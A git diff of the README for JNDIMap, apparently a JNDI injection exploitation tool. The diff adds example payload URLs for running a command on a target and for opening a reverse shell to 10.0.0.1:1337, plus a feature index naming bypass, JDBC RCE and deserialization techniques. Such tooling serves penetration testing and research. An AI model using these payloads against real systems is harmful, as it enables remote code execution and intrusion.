@@ -25,9 +25,14 @@ Download JNDIMap from the [Release](https://github.com/X1r0z/JNDIMap/releases) p
 java -jar JNDIMap-version.jar -i 10.0.0.1
 ```
 
-📖 [Documentation](USAGE.en.md)
+Execute command or reverse shell on the target machine
 
-## 📦 Features
+```bash
+rmi://10.0.0.1:1099/Basic/Command/open -a Calculator
+ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
+```
+
+## 🚩 Features
 
 - DNS Log
 - execute command
@@ -41,16 +46,34 @@ java -jar JNDIMap-version.jar -i 10.0.0.1
 - LDAP(s) deserialization
 - custom JNDI payload (based on Nashorn JS Engine)
 
+## 📖 Documentation
+
+> Full documentation: [USAGE.en.md](USAGE.en.md)
+
+- [Usage](USAGE.en.md#usage)
+- [Basic](USAGE.en.md#basic)
+- [Bypass](USAGE.en.md#bypass)
+- [MLet](USAGE.en.md#mlet)
+- [NativeLibLoader](USAGE.en.md#nativelibloader)
+- [JDBC RCE](USAGE.en.md#jdbc-rce)
+  - [MySQL](USAGE.en.md#mysql)
+  - [PostgreSQL](USAGE.en.md#postgresql)
+  - [H2](USAGE.en.md#h2)
+  - [Derby](USAGE.en.md#derby)
+- [Deserialize](USAGE.en.md#deserialize)
+- [Script](USAGE.en.md#script)
+- [useReferenceOnly](USAGE.en.md#usereferenceonly)
+
 ## ⚙️ Compile
 
-Based on JDK 8
+The version of [Releases](https://github.com/X1r0z/JNDIMap/releases) may be outdated, it is recommended to pull the source code and compile it yourself when using it (based on JDK 8)
 
 ```bash
 git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
 mvn package -Dmaven.test.skip=true
 ```
 
-## 📚 Reference
+## 📷 References & Acknowledgements
 
 [https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)
 
